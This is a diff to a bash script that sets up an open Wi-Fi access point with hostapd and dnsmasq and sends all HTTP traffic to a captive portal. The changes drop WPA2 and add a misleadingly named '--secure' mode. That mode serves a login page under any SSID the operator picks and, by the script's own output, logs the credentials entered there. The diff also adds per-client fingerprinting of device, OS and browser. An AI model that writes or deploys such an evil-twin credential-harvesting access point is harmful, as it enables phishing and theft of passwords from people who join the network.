@@ -4,15 +4,25 @@ set -e
 IFACE=wlan0
 AP_IP=192.168.50.1
 SSID=FreeWifi
-PASSWORD=JmilPass   # hardcoded WPA2 password (min 8 chars)
 
 # Usage:
-#   sudo bash start_free_ap.sh           → open network + warning captive portal
-#   sudo bash start_free_ap.sh --secure  → WPA2 + warning captive portal
-USE_PASSWORD=false
+#   sudo bash start_free_ap.sh                    → open network + warning captive portal
+#   sudo bash start_free_ap.sh --secure           → open network + login captive portal (SSID: FreeWifi)
+#   sudo bash start_free_ap.sh --secure "MyNet"   → open network + login captive portal (SSID: MyNet)
+USE_LOGIN_PORTAL=false
 USE_PORTAL=true
-for arg in "$@"; do
-    [ "$arg" = "--secure" ] && USE_PASSWORD=true
+while [ "$#" -gt 0 ]; do
+    case "$1" in
+        --secure)
+            USE_LOGIN_PORTAL=true
+            shift
+            if [ "$#" -gt 0 ] && [ "${1#--}" = "$1" ]; then
+                SSID="$1"
+                shift
+            fi
+            ;;
+        *) shift ;;
+    esac
 done
 HOSTAPD_CONF=/tmp/hostapd_hotspot.conf
 DNSMASQ_CONF=/tmp/dnsmasq_hotspot.conf
@@ -171,11 +181,21 @@ monitor_events() {
             IP=$(awk -v m="${MAC,,}" 'tolower($2)==m {print $3}' "$LEASE_FILE" 2>/dev/null | head -1)
             LEASE=$(lease_info "$MAC")
             NEIGHBOR=$(neighbor_info "$IP")
-            HOSTNAME=$(awk -v m="${MAC,,}" 'tolower($2)==m {print $4}' "$LEASE_FILE" 2>/dev/null | head -1)
-            VENDOR=$(vendor_lookup "$MAC")
-            DEVICE="${HOSTNAME:-$VENDOR}"
             file_log "[$(date '+%Y-%m-%d %H:%M:%S')] DISCONNECTED mac=$MAC  ip=${IP:-unknown}  $LEASE  $NEIGHBOR"
-            console_client "DISCONNECTED" "$DEVICE" "${IP:-unknown}" "$MAC"
+            REQUEST=$(grep -i "mac=${MAC,,} " "$LOG_FILE" 2>/dev/null \
+                | grep -E "PORTAL_REQUEST|WELCOME_REQUEST" | tail -1)
+            if [ -n "$REQUEST" ]; then
+                DEVICE=$(printf '%s' "$REQUEST" | awk -F'  ' '{for(i=1;i<=NF;i++) if($i~/^device=/) {sub(/^device=/,"",$i); print $i; exit}}')
+                OS_NAME=$(printf '%s' "$REQUEST" | awk -F'  ' '{for(i=1;i<=NF;i++) if($i~/^os=/) {sub(/^os=/,"",$i); print $i; exit}}')
+                BROWSER=$(printf '%s' "$REQUEST" | awk -F'  ' '{for(i=1;i<=NF;i++) if($i~/^browser_engine=/) {sub(/^browser_engine=/,"",$i); print $i; exit}}')
+            else
+                HOSTNAME=$(awk -v m="${MAC,,}" 'tolower($2)==m {print $4}' "$LEASE_FILE" 2>/dev/null | head -1)
+                VENDOR=$(vendor_lookup "$MAC")
+                DEVICE="${HOSTNAME:-$VENDOR}"
+                OS_NAME="unknown"
+                BROWSER="unknown"
+            fi
+            console_client "DISCONNECTED" "$DEVICE" "${IP:-unknown}" "$MAC" "$OS_NAME" "$BROWSER"
         fi
     done
 }
@@ -218,25 +238,7 @@ trap cleanup EXIT
 echo "[*] Writing configs..."
 preflight
 
-if $USE_PASSWORD; then
-    cat > "$HOSTAPD_CONF" << EOF
-interface=$IFACE
-driver=nl80211
-ssid=$SSID
-hw_mode=g
-channel=6
-ieee80211n=1
-wmm_enabled=1
-macaddr_acl=0
-auth_algs=1
-ignore_broadcast_ssid=0
-wpa=2
-wpa_passphrase=$PASSWORD
-wpa_key_mgmt=WPA-PSK
-rsn_pairwise=CCMP
-EOF
-else
-    cat > "$HOSTAPD_CONF" << EOF
+cat > "$HOSTAPD_CONF" << EOF
 interface=$IFACE
 driver=nl80211
 ssid=$SSID
@@ -248,7 +250,6 @@ macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
 EOF
-fi
 
 if $USE_PORTAL; then
     cat > "$DNSMASQ_CONF" << EOF
@@ -304,8 +305,13 @@ iw dev "$IFACE" info 2>/dev/null | grep -q "type AP" || die "hostapd did not put
 
 if $USE_PORTAL; then
     fuser -k 80/tcp 2>/dev/null || true
-    echo "[*] Starting captive portal..."
-    python3 "$(dirname "$0")/welcome.py" "$AP_IP" "$LOG_FILE" "$LEASE_FILE" &
+    if $USE_LOGIN_PORTAL; then
+        echo "[*] Starting login captive portal..."
+        python3 "$(dirname "$0")/portal.py" "$AP_IP" "$LOG_FILE" "$LEASE_FILE" "$SSID" &
+    else
+        echo "[*] Starting captive portal..."
+        python3 "$(dirname "$0")/welcome.py" "$AP_IP" "$LOG_FILE" "$LEASE_FILE" &
+    fi
     # wait until portal is actually listening before dnsmasq gives out IPs —
     # iOS fires the CNA probe the moment it gets a DHCP lease; if the portal
     # isn't ready yet iOS gets connection-refused, marks "no portal", never retries
@@ -313,7 +319,7 @@ if $USE_PORTAL; then
         ss -tlnp | grep -q ":80 " && break
         sleep 0.5
     done
-    ss -tlnp | grep -q ":80 " || die "welcome.py did not start listening on port 80"
+    ss -tlnp | grep -q ":80 " || die "portal did not start listening on port 80"
     echo "[*] Adding iptables rules (port 80 → portal)..."
     portal_iptables -A
 fi
@@ -323,8 +329,12 @@ dnsmasq --conf-file="$DNSMASQ_CONF" --no-daemon --log-async >/dev/null 2>>"$LOG_
 sleep 0.5
 pgrep -x dnsmasq >/dev/null || die "dnsmasq exited before it could serve DHCP"
 
-$USE_PASSWORD && echo "[+] Security: WPA2  password=$PASSWORD" || echo "[+] Security: open (no password)"
-$USE_PORTAL   && echo "[+] Portal:   http://$AP_IP  (warning page; all HTTP redirected here)" || true
+echo "[+] Security: open (no password)"
+if $USE_LOGIN_PORTAL; then
+    echo "[+] Portal:   http://$AP_IP  (login page — credentials logged to $LOG_FILE)"
+else
+    echo "[+] Portal:   http://$AP_IP  (warning page; all HTTP redirected here)"
+fi
 echo "[+] AP '$SSID' is up at $AP_IP. Press Ctrl+C to stop."
 echo "[+] Device log: $LOG_FILE"
 wait
